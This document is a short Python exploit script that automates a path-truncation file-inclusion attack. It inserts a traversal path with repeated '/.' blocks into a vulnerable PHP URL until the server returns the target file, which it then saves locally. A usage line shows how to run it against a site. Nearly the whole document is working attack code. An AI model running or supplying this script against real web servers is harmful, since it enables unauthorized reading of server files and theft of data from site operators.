import sys
import requests


def exploit(url:str, file:str, block):
	x_block = int(block) * "/."
	x_file = 'b/../'+file+'/.'
	c_url = url.replace("*", x_file)
	fail_req = requests.get(c_url).text
	test_req = ''
	C = 1

	print('Guessing Lenght\n')

	while True:
		test_req = requests.get(c_url).text

		if  test_req == fail_req:
			print('\n['+str(C)+']: '+c_url)
			c_url  += x_block
			test_req = requests.get(c_url).text
			x_block +=	x_block

		else:
			s = open(file, 'w')
			s.write(test_req)
			s.close()
			print('\n\n operation successful, file saved as "'+file+'"')
			break
	

def help():
	print('\nUsage: python3 https://www.example.com/dir/vuln.php?=* [filename] [block-num]\n')




if __name__ == "__main__":
	if '-h' in sys.argv:
		help()
	else:
		try:
			exploit(sys.argv[1], sys.argv[2], sys.argv[3])
		except:
			help()